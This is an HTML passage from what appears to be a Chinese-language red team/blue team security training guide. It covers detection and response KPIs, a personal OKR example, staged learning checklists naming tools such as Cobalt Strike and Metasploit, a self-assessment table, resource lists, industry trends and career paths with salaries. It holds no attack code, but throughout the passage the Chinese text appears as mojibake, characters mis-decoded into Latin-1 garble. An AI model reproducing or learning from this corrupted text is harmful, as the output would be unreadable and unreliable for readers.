<li><strong>è¯„ä¼°ç»´åº¦</strong>ï¼šæŠ€èƒ½ã€æµç¨‹ã€å·¥å…·ã€ååŒã€æˆæœã€å½±å“åŠ›ã€‚</li>
<li><strong>è¾“å‡º</strong>ï¼šèƒ½åŠ›é›·è¾¾ã€OKRæŒ‡æ ‡ã€æ¼”ç»ƒKPIã€å­¦ä¹ æ—¥å¿—æ¨¡æ¿ã€ä½œå“é›†æŒ‡å—ã€‚</li>
</ul>
<h4 id="çº¢è“å¯¹æŠ—kpiå‚è€ƒ"><a class="header" href="#çº¢è“å¯¹æŠ—kpiå‚è€ƒ">çº¢è“å¯¹æŠ—KPIå‚è€ƒ</a></h4>
<div class="table-wrapper"><table><thead><tr><th>æŒ‡æ ‡ç±»åˆ«</th><th>æŒ‡æ ‡åç§°</th><th>æè¿°</th><th>ç›®æ ‡å€¼</th><th>å¤‡æ³¨</th></tr></thead><tbody>
<tr><td>æ£€æµ‹æ•ˆç‡</td><td>MTTD (Mean Time To Detect)</td><td>ä»æ”»å‡»å‘ç”Ÿåˆ°å‘Šè­¦è§¦å‘çš„å¹³å‡æ—¶é—´</td><td>&lt; 15 åˆ†é’Ÿ</td><td>å…³é”®èµ„äº§ &lt;5 åˆ†é’Ÿ</td></tr>
<tr><td>å“åº”æ•ˆç‡</td><td>MTTR (Mean Time To Respond)</td><td>ä»å‘Šè­¦åˆ°é‡‡å–è¡ŒåŠ¨çš„å¹³å‡æ—¶é—´</td><td>&lt; 30 åˆ†é’Ÿ</td><td>é«˜å±å‘Šè­¦ä¼˜å…ˆ</td></tr>
<tr><td>æ¼”ç»ƒè¦†ç›–</td><td>MITREè¦†ç›–ç‡</td><td>ATT&amp;CKæˆ˜æœ¯è¦†ç›–æ•°é‡ / æ€»æˆ˜æœ¯æ•°</td><td>â‰¥ 80%</td><td>æ ¸å¿ƒæŠ€æœ¯ â‰¥ 70%</td></tr>
<tr><td>æ”¹è¿›é—­ç¯</td><td>è¡ŒåŠ¨é¡¹å…³é—­ç‡</td><td>30å¤©å†…å®Œæˆçš„æ”¹è¿›é¡¹ / æ€»æ•°</td><td>â‰¥ 85%</td><td>ç™½é˜Ÿè´Ÿè´£è·Ÿè¸ª</td></tr>
<tr><td>å­¦ä¹ æ²‰æ·€</td><td>çŸ¥è¯†è¾“å‡ºé¢‘ç‡</td><td>åšå®¢/åˆ†äº«/å·¥å…·æ›´æ–°æ¬¡æ•°</td><td>â‰¥ 2æ¬¡/æœˆ</td><td>å›¢é˜Ÿå…±å»º</td></tr>
</tbody></table>
</div>
<h4 id="ä¸ªäººæˆé•¿okrç¤ºä¾‹"><a class="header" href="#ä¸ªäººæˆé•¿okrç¤ºä¾‹">ä¸ªäººæˆé•¿OKRç¤ºä¾‹</a></h4>
<ul>
<li><strong>Objective</strong>ï¼šæˆä¸ºèƒ½å¤Ÿç‹¬ç«‹ä¸»æŒçº¢è“å¯¹æŠ—æ¼”ç»ƒçš„ä¸“å®¶ã€‚
<ul>
<li>KR1ï¼šå®Œæˆä¸å°‘äº3æ¬¡çº¢é˜Ÿä¸è“é˜ŸåŒè§’è‰²æ¼”ç»ƒå¹¶äº¤ä»˜æŠ¥å‘Šã€‚</li>
<li>KR2ï¼šè¾“å‡º12ç¯‡æ¼”ç»ƒå¤ç›˜æˆ–æŠ€æœ¯æ–‡ç« ï¼Œå¹¶åœ¨ç¤¾åŒºåˆ†äº«â‰¥2æ¬¡ã€‚</li>
<li>KR3ï¼šå°†å›¢é˜Ÿæ£€æµ‹è¦†ç›–ç‡æå‡åˆ°80%ï¼Œæ–°å¢â‰¥10æ¡é«˜è´¨é‡æ£€æµ‹è§„åˆ™ã€‚</li>
</ul>
</li>
</ul>
<h3 id="-é˜¶æ®µä¸€åŸºç¡€ç†è®º2å‘¨"><a class="header" href="#-é˜¶æ®µä¸€åŸºç¡€ç†è®º2å‘¨">âœ… é˜¶æ®µä¸€ï¼šåŸºç¡€ç†è®ºï¼ˆ2å‘¨ï¼‰</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
ç†è§£çº¢è“å¯¹æŠ—æ ¸å¿ƒæ¦‚å¿µ</li>
<li><input disabled="" type="checkbox"/>
æŒæ¡MITRE ATT&amp;CKæ¡†æ¶</li>
<li><input disabled="" type="checkbox"/>
äº†è§£å¸¸è§æ”»å‡»æŠ€æœ¯</li>
<li><input disabled="" type="checkbox"/>
ç†Ÿæ‚‰åŸºç¡€é˜²å¾¡ç­–ç•¥</li>
</ul>
<h3 id="-é˜¶æ®µäºŒçº¢é˜ŸæŠ€èƒ½6å‘¨"><a class="header" href="#-é˜¶æ®µäºŒçº¢é˜ŸæŠ€èƒ½6å‘¨">âœ… é˜¶æ®µäºŒï¼šçº¢é˜ŸæŠ€èƒ½ï¼ˆ6å‘¨ï¼‰</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
æŒæ¡3ç§ä»¥ä¸Šåˆå§‹è®¿é—®æŠ€æœ¯</li>
<li><input disabled="" type="checkbox"/>
èƒ½å¤Ÿä½¿ç”¨Cobalt Strike/Metasploit</li>
<li><input disabled="" type="checkbox"/>
ç†Ÿç»ƒè¿›è¡Œæƒé™æå‡</li>
<li><input disabled="" type="checkbox"/>
æŒæ¡æ¨ªå‘ç§»åŠ¨æŠ€æœ¯</li>
<li><input disabled="" type="checkbox"/>
å®Œæˆ10ä¸ªå†…ç½‘é¶æœº</li>
</ul>
<h3 id="-é˜¶æ®µä¸‰è“é˜ŸæŠ€èƒ½6å‘¨"><a class="header" href="#-é˜¶æ®µä¸‰è“é˜ŸæŠ€èƒ½6å‘¨">âœ… é˜¶æ®µä¸‰ï¼šè“é˜ŸæŠ€èƒ½ï¼ˆ6å‘¨ï¼‰</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
éƒ¨ç½²å¹¶é…ç½®SIEMç³»ç»Ÿ</li>
<li><input disabled="" type="checkbox"/>
ç¼–å†™æ£€æµ‹è§„åˆ™</li>
<li><input disabled="" type="checkbox"/>
è¿›è¡Œå¨èƒç‹©çŒ</li>
<li><input disabled="" type="checkbox"/>
æ‰§è¡Œåº”æ€¥å“åº”æµç¨‹</li>
<li><input disabled="" type="checkbox"/>
å®Œæˆ3æ¬¡å–è¯åˆ†æ</li>
</ul>
<h3 id="-é˜¶æ®µå››ç´«é˜ŸååŒ2å‘¨"><a class="header" href="#-é˜¶æ®µå››ç´«é˜ŸååŒ2å‘¨">âœ… é˜¶æ®µå››ï¼šç´«é˜ŸååŒï¼ˆ2å‘¨ï¼‰</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
ä½¿ç”¨Atomic Red Teamæµ‹è¯•</li>
<li><input disabled="" type="checkbox"/>
éƒ¨ç½²Calderaå¹³å°</li>
<li><input disabled="" type="checkbox"/>
ä¼˜åŒ–æ£€æµ‹è§„åˆ™</li>
<li><input disabled="" type="checkbox"/>
å®Œå–„å“åº”æµç¨‹</li>
</ul>
<h3 id="-é˜¶æ®µäº”å®æˆ˜æ¼”ç»ƒ4å‘¨"><a class="header" href="#-é˜¶æ®µäº”å®æˆ˜æ¼”ç»ƒ4å‘¨">âœ… é˜¶æ®µäº”ï¼šå®æˆ˜æ¼”ç»ƒï¼ˆ4å‘¨ï¼‰</a></h3>
<ul>
<li><input disabled="" type="checkbox"/>
å‚ä¸å®Œæ•´çº¢è“å¯¹æŠ—æ¼”ç»ƒ</li>
<li><input disabled="" type="checkbox"/>
ç¼–å†™æ¼”ç»ƒæŠ¥å‘Š</li>
<li><input disabled="" type="checkbox"/>
å®æ–½æ”¹è¿›æªæ–½</li>
<li><input disabled="" type="checkbox"/>
é€šè¿‡ç›¸å…³è®¤è¯ï¼ˆGPEN/GCIHï¼‰</li>
</ul>
<h3 id="èƒ½åŠ›é›·è¾¾è‡ªè¯„è¡¨"><a class="header" href="#èƒ½åŠ›é›·è¾¾è‡ªè¯„è¡¨">èƒ½åŠ›é›·è¾¾è‡ªè¯„è¡¨</a></h3>
<div class="table-wrapper"><table><thead><tr><th>èƒ½åŠ›ç»´åº¦</th><th>ç­‰çº§1æè¿°</th><th>ç­‰çº§3æè¿°</th><th>ç­‰çº§5æè¿°</th><th>å½“å‰è¯„åˆ†</th><th>ç›®æ ‡è¯„åˆ†</th></tr></thead><tbody>
<tr><td>çº¢é˜Ÿæ”»å‡»</td><td>ä»…ç†Ÿæ‚‰å¸¸è§„å·¥å…·ä½¿ç”¨</td><td>èƒ½å¤Ÿå®šåˆ¶Payloadã€æ„å»ºæ”»å‡»é“¾</td><td>å…·å¤‡APTæ¨¡æ‹Ÿèƒ½åŠ›ã€å¯å¼€å‘è‡ªç ”å·¥å…·</td><td></td><td></td></tr>
<tr><td>è“é˜Ÿæ£€æµ‹</td><td>èƒ½åˆ†æå•æ¡å‘Šè­¦</td><td>èƒ½è®¾è®¡æ£€æµ‹è§„åˆ™ä¸ä»ªè¡¨æ¿</td><td>æ„å»ºè‡ªåŠ¨åŒ–æ£€æµ‹å¹³å°å¹¶æŒç»­ä¼˜åŒ–</td><td></td><td></td></tr>
<tr><td>ç´«é˜ŸååŒ</td><td>è¢«åŠ¨å‚ä¸å¤ç›˜</td><td>èƒ½ä¸»æŒå°å‹éªŒè¯æ´»åŠ¨</td><td>æ¨åŠ¨æ”»é˜²å¸¸æ€åŒ–ã€æŒ‡æ ‡ä½“ç³»åŒ–</td><td></td><td></td></tr>
<tr><td>æµç¨‹æ²»ç†</td><td>äº†è§£åŸºæœ¬æµç¨‹</td><td>èƒ½ç¼–å†™æ¼”ç»ƒSOPã€æŠ¥å‘Š</td><td>è®¾è®¡å…¨å±€æ²»ç†ä½“ç³»ã€æŒ‡æ ‡é—­ç¯</td><td></td><td></td></tr>
<tr><td>æ²Ÿé€šå½±å“</td><td>å†…éƒ¨åˆ†äº«</td><td>ç»„ç»‡è·¨éƒ¨é—¨åŸ¹è®­</td><td>å¯¹å¤–æ¼”è®²ã€è¡Œä¸šå½±å“åŠ›</td><td></td><td></td></tr>
</tbody></table>
</div>
<h3 id="èƒ½åŠ›æ¡£æ¡ˆå¤¹portfolioå»ºè®®"><a class="header" href="#èƒ½åŠ›æ¡£æ¡ˆå¤¹portfolioå»ºè®®">èƒ½åŠ›æ¡£æ¡ˆå¤¹ï¼ˆPortfolioï¼‰å»ºè®®</a></h3>
<ul>
<li><strong>é¡¹ç›®æ–‡æ¡£</strong>ï¼šæˆæƒä¹¦ã€è®¡åˆ’ä¹¦ã€æ—¥æŠ¥ã€å¤ç›˜æŠ¥å‘Šã€‚</li>
<li><strong>æŠ€æœ¯æˆæœ</strong>ï¼šè„šæœ¬ã€æ£€æµ‹è§„åˆ™ã€è‡ªåŠ¨åŒ–å‰§æœ¬ã€å·¥å…·è¯´æ˜ã€‚</li>
<li><strong>æ¼”è®²è¾“å‡º</strong>ï¼šPPTã€è§†é¢‘ã€åšå®¢ã€æ’­å®¢ã€ç¤¾åŒºå¸–å­ã€‚</li>
<li><strong>æŒ‡æ ‡è¯æ®</strong>ï¼šMTTD/MTTRæ”¹è¿›å‰åå¯¹æ¯”ã€æ£€æµ‹è¦†ç›–ç‡å›¾è¡¨ã€‚</li>
<li><strong>è£èª‰è®¤è¯</strong>ï¼šè¯ä¹¦ã€ç«èµ›æˆç»©ã€å®¢æˆ·æ¨èã€å†…éƒ¨è¡¨å½°ã€‚</li>
</ul>
<h3 id="å­¦ä¹ èŠ‚å¥ä¸å¤ç›˜æœºåˆ¶"><a class="header" href="#å­¦ä¹ èŠ‚å¥ä¸å¤ç›˜æœºåˆ¶">å­¦ä¹ èŠ‚å¥ä¸å¤ç›˜æœºåˆ¶</a></h3>
<ul>
<li><strong>å­£åº¦å¤ç›˜</strong>ï¼š
<ol>
<li>æ±‡æ€»æ¼”ç»ƒæ¬¡æ•°ã€æˆåŠŸç‡ã€é£é™©é—­ç¯ã€‚</li>
<li>æ›´æ–°èƒ½åŠ›é›·è¾¾å›¾ï¼Œåˆ¶å®šä¸‹å­£åº¦OKRã€‚</li>
<li>è¯„ä¼°å·¥å…·åº“æ›´æ–°æƒ…å†µã€è‡ªåŠ¨åŒ–è¦†ç›–ç‡ã€‚</li>
</ol>
</li>
<li><strong>æœˆåº¦å†²åˆº</strong>ï¼š
<ul>
<li>è®¾ç½®ä¸»é¢˜ï¼ˆå¦‚â€œäº‘æ”»é˜²æœˆâ€â€œAPTæ¨¡æ‹Ÿæœˆâ€ï¼‰ã€‚</li>
<li>æ¯å‘¨è¾“å‡ºè‡³å°‘ä¸€ç¯‡å¤ç›˜æˆ–æŠ€æœ¯æ–‡ç« ã€‚</li>
<li>ç»„ç»‡ä¸€æ¬¡çº¢è“çŸ¥è¯†åˆ†äº«ä¼šã€‚</li>
</ul>
</li>
<li><strong>æ¯æ—¥ä¾‹è¡Œ</strong>ï¼š
<ul>
<li>Morning Briefï¼šå…³æ³¨æœ€æ–°CVEã€å¨èƒæƒ…æŠ¥ã€‚</li>
<li>Evening Wrapï¼šè®°å½•å½“æ—¥äº®ç‚¹ä¸é—®é¢˜ã€‚</li>
</ul>
</li>
</ul>
<h3 id="å­¦ä¹ ç¤¾ç¾¤è¿è¥å»ºè®®"><a class="header" href="#å­¦ä¹ ç¤¾ç¾¤è¿è¥å»ºè®®">å­¦ä¹ ç¤¾ç¾¤è¿è¥å»ºè®®</a></h3>
<ul>
<li>å»ºç«‹å†…éƒ¨Wikiæˆ–Notionâ€œæ”»é˜²çŸ¥è¯†åº“â€ã€‚</li>
<li>æ¯å‘¨å¼€å±•ä¸€æ¬¡Lightning Talkï¼ˆ10åˆ†é’Ÿå¿«é€Ÿåˆ†äº«ï¼‰ã€‚</li>
<li>å¯åŠ¨â€œå¸ˆå¾’åˆ¶â€ï¼šåˆçº§å·¥ç¨‹å¸ˆé…å¯¹èµ„æ·±å¯¼å¸ˆã€‚</li>
<li>è®¾ç«‹â€œæ”»é˜²ä¹‹æ˜Ÿâ€å¥–é¡¹ï¼Œè¡¨å½°ä¼˜ç§€è´¡çŒ®ã€‚</li>
<li>ä¸å¤–éƒ¨ç¤¾åŒºè”åŠ¨ï¼šOWASPã€æœ¬åœ°å®‰å…¨æ²™é¾™ã€SRC Meetupã€‚</li>
</ul>
<hr />
<hr />
<h2 id="æ¨¡å—å…«èµ„æºæ‹“å±•ä¸è¡Œä¸šæ´å¯Ÿ"><a class="header" href="#æ¨¡å—å…«èµ„æºæ‹“å±•ä¸è¡Œä¸šæ´å¯Ÿ">æ¨¡å—å…«ï¼šèµ„æºæ‹“å±•ä¸è¡Œä¸šæ´å¯Ÿ</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆèµ„æºè§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆèµ„æºè§†è§’">æ¨¡å—æ€»è§ˆï¼ˆèµ„æºè§†è§’ï¼‰</a></h3>
<ul>
<li><strong>ç›®çš„</strong>ï¼šæ„å»ºå¤šå±‚æ¬¡å­¦ä¹ ä¸æƒ…æŠ¥è·å–æ¸ é“ï¼Œç¡®ä¿æŠ€æœ¯ã€æµç¨‹ã€è¡Œä¸šè¶‹åŠ¿åŒæ­¥æ›´æ–°ã€‚</li>
<li><strong>ç»“æ„</strong>ï¼šä¹¦ç± â†’ è¯¾ç¨‹ â†’ å¹³å° â†’ ç¤¾åŒº â†’ æƒ…æŠ¥ â†’ èµ›äº‹ â†’ è®ºå›ã€‚</li>
<li><strong>ç­–ç•¥</strong>ï¼šæ ¸å¿ƒèµ„æºï¼ˆå¿…ä¿®ï¼‰ã€æ‹“å±•èµ„æºï¼ˆé€‰ä¿®ï¼‰ã€å®æˆ˜èµ„æºï¼ˆç»ƒä¹ ï¼‰ã€æ´å¯Ÿèµ„æºï¼ˆè¶‹åŠ¿ï¼‰ã€‚</li>
</ul>
<h3 id="-æ¨èä¹¦ç±"><a class="header" href="#-æ¨èä¹¦ç±">ğŸ“š æ¨èä¹¦ç±</a></h3>
<ol>
<li><strong>ã€ŠRed Team: How to Succeed By Thinking Like the Enemyã€‹</strong> - çº¢é˜Ÿæ€ç»´</li>
<li><strong>ã€ŠBlue Team Handbookã€‹</strong> - è“é˜Ÿå®æˆ˜æ‰‹å†Œ</li>
<li><strong>ã€ŠApplied Incident Responseã€‹</strong> - åº”æ€¥å“åº”å®è·µ</li>
<li><strong>ã€ŠThe Art of Network Penetration Testingã€‹</strong> - ç½‘ç»œæ¸—é€è‰ºæœ¯</li>
</ol>
<h3 id="-åœ¨çº¿è¯¾ç¨‹"><a class="header" href="#-åœ¨çº¿è¯¾ç¨‹">ğŸ“ åœ¨çº¿è¯¾ç¨‹</a></h3>
<ul>
<li>SANS SEC564: Red Team Operations</li>
<li>SANS SEC555: SIEM Implementation</li>
<li>Offensive Security: OSCP/OSEP</li>
<li>eLearnSecurity: eCIR (æ•°å­—å–è¯)</li>
</ul>
<h3 id="-å®æˆ˜å¹³å°"><a class="header" href="#-å®æˆ˜å¹³å°">ğŸ”§ å®æˆ˜å¹³å°</a></h3>
<ul>
<li><strong>RangeForce</strong>: è“é˜ŸåŸ¹è®­å¹³å°</li>
<li><strong>Immersive Labs</strong>: çº¢è“å¯¹æŠ—è®­ç»ƒ</li>
<li><strong>Cyber Defenders</strong>: è“é˜ŸæŒ‘æˆ˜</li>
<li><strong>Attack Defense</strong>: åœ¨çº¿å¯¹æŠ—å¹³å°</li>
</ul>
<h3 id="-å®‰å…¨èµ„è®¯"><a class="header" href="#-å®‰å…¨èµ„è®¯">ğŸ“° å®‰å…¨èµ„è®¯</a></h3>
<ul>
<li><strong>MITRE ATT&amp;CK</strong>: æˆ˜æœ¯çŸ¥è¯†åº“</li>
<li><strong>SpecterOps Blog</strong>: çº¢é˜Ÿç ”ç©¶</li>
<li><strong>Red Canary Blog</strong>: å¨èƒæ£€æµ‹</li>
<li><strong>DFIR Report</strong>: äº‹ä»¶å“åº”æŠ¥å‘Š</li>
</ul>
<h3 id="-æ¨èèµ›äº‹ä¸æ¼”ç»ƒå¹³å°"><a class="header" href="#-æ¨èèµ›äº‹ä¸æ¼”ç»ƒå¹³å°">âš”ï¸ æ¨èèµ›äº‹ä¸æ¼”ç»ƒå¹³å°</a></h3>
<div class="table-wrapper"><table><thead><tr><th>èµ›äº‹/å¹³å°</th><th>ç±»å‹</th><th>å‘¨æœŸ</th><th>è¯´æ˜</th></tr></thead><tbody>
<tr><td>å›½å®¶çº§æŠ¤ç½‘</td><td>å¤§å‹å®æˆ˜æ¼”ç»ƒ</td><td>æ¯å¹´</td><td>å…³æ³¨å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½æ”»é˜²ï¼Œå¯¹æµç¨‹å’ŒååŒè¦æ±‚é«˜</td></tr>
<tr><td>XCTFè”èµ›</td><td>æ”»é˜²å…¼å¤‡</td><td>æ¯å¹´</td><td>æ¶µç›–Webã€Pwnã€é€†å‘ã€å–è¯ç­‰å¤šé¢†åŸŸ</td></tr>
<tr><td>çº¢å¸½æ¯</td><td>ä¼ä¸šæ”»é˜²æ¼”ç»ƒ</td><td>æ¯å¹´</td><td>ä¸çœŸå®ä¼ä¸šç¯å¢ƒç»“åˆï¼Œé€‚åˆçº¢è“ååŒ</td></tr>
<tr><td>BlueHat/BlackHat Trainings</td><td>å›½é™…å®‰å…¨å¤§ä¼š</td><td>æ¯å¹´</td><td>è·å–æœ€æ–°æ”»é˜²æŠ€æœ¯ï¼Œæ‹“å±•è§†é‡</td></tr>
<tr><td>ICS CTF</td><td>å·¥æ§å®‰å…¨</td><td>æ¯å¹´</td><td>èšç„¦OT/ICSåœºæ™¯çš„æ”»é˜²æŒ‘æˆ˜</td></tr>
</tbody></table>
</div>
<h3 id="-ä¿¡æ¯è·å–ç­–ç•¥"><a class="header" href="#-ä¿¡æ¯è·å–ç­–ç•¥">ğŸ—ï¸ ä¿¡æ¯è·å–ç­–ç•¥</a></h3>
<ul>
<li><strong>æ¯æ—¥</strong>ï¼šRSSè®¢é˜…ï¼ˆSecurityWeekã€BleepingComputerã€FreeBufï¼‰ã€Twitter/Xå®‰å…¨è´¦å·ã€Telegramæƒ…æŠ¥é¢‘é“ã€‚</li>
<li><strong>æ¯å‘¨</strong>ï¼šé˜…è¯»DFIR Reportã€Mandiantåšå®¢ã€å¥‡å®‰ä¿¡/è…¾è®¯ç§‘æ©æ”»é˜²ç ”ç©¶ã€Azure/AWSå®‰å…¨å…¬å‘Šã€‚</li>
<li><strong>æ¯æœˆ</strong>ï¼šæ•´ç†ä¸€ä»½æƒ…æŠ¥æ‘˜è¦ï¼ˆTopæ¼æ´ã€Topæ”»å‡»æ¡ˆä¾‹ã€æ£€æµ‹å»ºè®®ï¼‰å‘é€ç»™å›¢é˜Ÿã€‚</li>
<li><strong>äº‹ä»¶é©±åŠ¨</strong>ï¼šå½“å‡ºç°é‡å¤§CVEï¼ˆå¦‚Exchange ProxyLogonã€Log4Shellï¼‰ï¼Œç«‹å³ç»„ç»‡æ¡Œé¢æ¼”ç»ƒã€‚</li>
</ul>
<h3 id="-è¡Œä¸šè¶‹åŠ¿è§‚å¯Ÿ"><a class="header" href="#-è¡Œä¸šè¶‹åŠ¿è§‚å¯Ÿ">ğŸ§­ è¡Œä¸šè¶‹åŠ¿è§‚å¯Ÿ</a></h3>
<ul>
<li><strong>äº‘åŸç”Ÿå®‰å…¨</strong>ï¼šå…³æ³¨ä¾›åº”é“¾ã€å®¹å™¨é€ƒé€¸ã€Kubernetes RBACæ»¥ç”¨ï¼›å»ºè®®è·Ÿè¿›KubeConã€CloudNativeSecurityã€‚</li>
<li><strong>AIè¾…åŠ©æ”»é˜²</strong>ï¼šç ”ç©¶AIç”Ÿæˆé’“é±¼å†…å®¹ã€è‡ªåŠ¨ç¼–ç å·¥å…·ï¼ŒåŒæ—¶å…³æ³¨AIæ¨¡å‹å®‰å…¨ï¼ˆæç¤ºæ³¨å…¥ã€æ¨¡å‹çªƒå–ï¼‰ã€‚</li>
<li><strong>é›¶ä¿¡ä»»å®è·µ</strong>ï¼šè·Ÿè¸ªNIST 800-207ã€é«˜å¯ä¿¡èº«ä»½è®¤è¯ã€å¾®éš”ç¦»æ–¹æ¡ˆçš„æ”»é˜²å¯¹æŠ—å˜åŒ–ã€‚</li>
<li><strong>åˆè§„é©±åŠ¨</strong>ï¼šCSCCã€Šç½‘ç»œå®‰å…¨æ¼æ´æŠ¥å‘Šè¦æ±‚ã€‹ã€ç­‰ä¿2.0å‡çº§ã€å®‰å…¨è¿è¥ä¸æ”»é˜²æ¼”ç»ƒçº³å…¥ç›‘ç®¡è€ƒæ ¸ã€‚</li>
<li><strong>è¡Œä¸šæ¡ˆä¾‹åº“</strong>ï¼šå»ºè®®æ”¶é›†é‡‘èã€åˆ¶é€ ã€èƒ½æºã€åŒ»ç–—ç­‰å…¸å‹è¡Œä¸šæ”»é˜²æ¡ˆä¾‹ï¼Œå½¢æˆè¡Œä¸šä¸“é¢˜åº“ã€‚</li>
</ul>
<hr />
<hr />
<h2 id="æ¨¡å—ä¹èŒä¸šå‘å±•ä¸æˆé•¿è·¯å¾„"><a class="header" href="#æ¨¡å—ä¹èŒä¸šå‘å±•ä¸æˆé•¿è·¯å¾„">æ¨¡å—ä¹ï¼šèŒä¸šå‘å±•ä¸æˆé•¿è·¯å¾„</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆèŒä¸šè§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆèŒä¸šè§†è§’">æ¨¡å—æ€»è§ˆï¼ˆèŒä¸šè§†è§’ï¼‰</a></h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šå¸®åŠ©å­¦ä¹ è€…è§„åˆ’çº¢é˜Ÿã€è“é˜Ÿã€ç´«é˜Ÿä¹ƒè‡³å®‰å…¨æ¶æ„å²—ä½çš„èŒä¸šå‘å±•è·¯å¾„ï¼Œæ˜ç¡®æŠ€èƒ½æ ˆã€è¯ä¹¦ã€é¡¹ç›®ç»éªŒã€è½¯æŠ€èƒ½ä¸å½±å“åŠ›å»ºè®¾ã€‚</li>
<li><strong>æ–¹æ³•</strong>ï¼šåˆ†å±‚çº§è¯„ä¼° + èƒ½åŠ›çŸ©é˜µ + ä½œå“é›† + äº§ä¸šåœˆå±‚ã€‚</li>
<li><strong>å…³é”®æ­¥éª¤</strong>ï¼šå®šä½ â†’ ç§¯ç´¯ â†’ è®¤è¯ â†’ è¾“å‡º â†’ é¢†å¯¼åŠ›ã€‚</li>
</ul>
<h3 id="çº¢é˜Ÿå·¥ç¨‹å¸ˆ"><a class="header" href="#çº¢é˜Ÿå·¥ç¨‹å¸ˆ">çº¢é˜Ÿå·¥ç¨‹å¸ˆ</a></h3>
<p><strong>åˆçº§ï¼ˆ0-2å¹´ï¼‰</strong>:</p>
<ul>
<li>æŒæ¡åŸºç¡€æ¸—é€æŠ€æœ¯</li>
<li>ç†Ÿç»ƒä½¿ç”¨ä¸»æµå·¥å…·</li>
<li>å‚ä¸çº¢é˜Ÿé¡¹ç›®</li>
<li>å¹´è–ªï¼š20-35ä¸‡</li>
</ul>
<p><strong>ä¸­çº§ï¼ˆ2-5å¹´ï¼‰</strong>:</p>
<ul>
<li>ç‹¬ç«‹å®Œæˆçº¢é˜Ÿé¡¹ç›®</li>
<li>å¼€å‘è‡ªå®šä¹‰å·¥å…·</li>
<li>APTæ”»å‡»æ¨¡æ‹Ÿ</li>
<li>å¹´è–ªï¼š35-60ä¸‡</li>
</ul>
<p><strong>é«˜çº§ï¼ˆ5å¹´ä»¥ä¸Šï¼‰</strong>:</p>
<ul>
<li>çº¢é˜Ÿè´Ÿè´£äºº</li>
<li>0dayç ”ç©¶</li>
<li>åŸ¹è®­å›¢é˜Ÿ</li>
<li>å¹´è–ªï¼š60-100ä¸‡+</li>
</ul>
<h3 id="è“é˜Ÿå·¥ç¨‹å¸ˆ"><a class="header" href="#è“é˜Ÿå·¥ç¨‹å¸ˆ">è“é˜Ÿå·¥ç¨‹å¸ˆ</a></h3>
<p><strong>åˆçº§ï¼ˆ0-2å¹´ï¼‰</strong>:</p>
<ul>
<li>SOCåˆ†æå¸ˆ</li>
<li>å‘Šè­¦åˆ†ç±»å¤„ç†</li>
<li>åŸºç¡€åº”æ€¥å“åº”</li>
<li>å¹´è–ªï¼š15-30ä¸‡</li>
</ul>
<p><strong>ä¸­çº§ï¼ˆ2-5å¹´ï¼‰</strong>:</p>
<ul>
<li>å¨èƒç‹©çŒåˆ†æå¸ˆ</li>
<li>æ£€æµ‹è§„åˆ™å¼€å‘</li>
<li>äº‹ä»¶å“åº”ä¸“å®¶</li>
<li>å¹´è–ªï¼š30-50ä¸‡</li>
</ul>
<p><strong>é«˜çº§ï¼ˆ5å¹´ä»¥ä¸Šï¼‰</strong>:</p>
<ul>
<li>SOCæ¶æ„å¸ˆ</li>
<li>å¨èƒæƒ…æŠ¥ä¸“å®¶</li>
<li>åº”æ€¥å“åº”è´Ÿè´£äºº</li>
<li>å¹´è–ªï¼š50-80ä¸‡+</li>
</ul>
<h3 id="è·¨è§’è‰²æˆé•¿è·¯å¾„"><a class="header" href="#è·¨è§’è‰²æˆé•¿è·¯å¾„">è·¨è§’è‰²æˆé•¿è·¯å¾„</a></h3>
<div class="table-wrapper"><table><thead><tr><th>å¹´é™</th><th>çº¢é˜Ÿå‘å±•</th><th>è“é˜Ÿå‘å±•</th><th>ç´«é˜Ÿ/å®‰å…¨æ¶æ„å‘å±•</th><th>å»ºè®®è¯ä¹¦</th><th>å…³é”®æˆæœ</th></tr></thead><tbody>
<tr><td>0-1å¹´</td><td>å®ŒæˆåŸºç¡€æ¸—é€è¯¾ç¨‹ï¼Œå‚ä¸CTF</td><td>ç†Ÿæ‚‰SIEMã€æ—¥å¿—åˆ†æ</td><td>ååŠ©é›†æˆå·¥å…·ã€å­¦ä¹ æµç¨‹</td><td>eJPTã€CCSK</td><td>å®Œæˆ3æ¬¡é¶æœºæ¼”ç»ƒã€1æ¬¡æ£€æµ‹è§„åˆ™ä¸Šçº¿</td></tr>
<tr><td>1-3å¹´</td><td>ä¸»å¯¼å°å‹çº¢é˜Ÿé¡¹ç›®ï¼Œç¼–å†™è„šæœ¬</td><td>è®¾è®¡æ£€æµ‹è§„åˆ™ã€å“åº”æ‰‹å†Œ</td><td>ä¸»æŒ1-2ä¸ªç´«é˜Ÿåœºæ™¯ã€æ¨åŠ¨æŒ‡æ ‡</td><td>OSCPã€GCIA</td><td>è¾“å‡º10ç¯‡å¤ç›˜ã€2ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬</td></tr>
<tr><td>3-5å¹´</td><td>æ„å»ºæ”»å‡»é“¾ã€å¼€å‘è‡ªç ”å·¥å…·</td><td>ç»Ÿç­¹SOCã€å¼€å±•å¨èƒç‹©çŒ</td><td>è´Ÿè´£æ”»é˜²è®¡åˆ’ã€æŒ‡æ ‡ç®¡ç†</td><td>OSEPã€GCTI</td><td>å®Œæˆå¤§å‹æ¼”ç»ƒã€å»ºç«‹çŸ¥è¯†åº“</td></tr>
<tr><td>5å¹´ä»¥ä¸Š</td><td>æ„å»ºçº¢é˜Ÿä½“ç³»ã€0dayç ”ç©¶</td><td>æ„å»ºå®‰å…¨è¿è¥ä½“ç³»ã€å¼•å…¥SOAR</td><td>è®¾è®¡å®‰å…¨æ¶æ„ã€æ¨åŠ¨å®‰å…¨æ²»ç†</td><td>OSCE3ã€GSE</td><td>ä¸»å¯¼è¡Œä¸šçº§æ¼”ç»ƒã€å‘è¡¨ç ”ç©¶æŠ¥å‘Š</td></tr>
</tbody></table>
</div>
<h3 id="å½±å“åŠ›å»ºè®¾æŒ‡å—"><a class="header" href="#å½±å“åŠ›å»ºè®¾æŒ‡å—">å½±å“åŠ›å»ºè®¾æŒ‡å—</a></h3>
<ol>
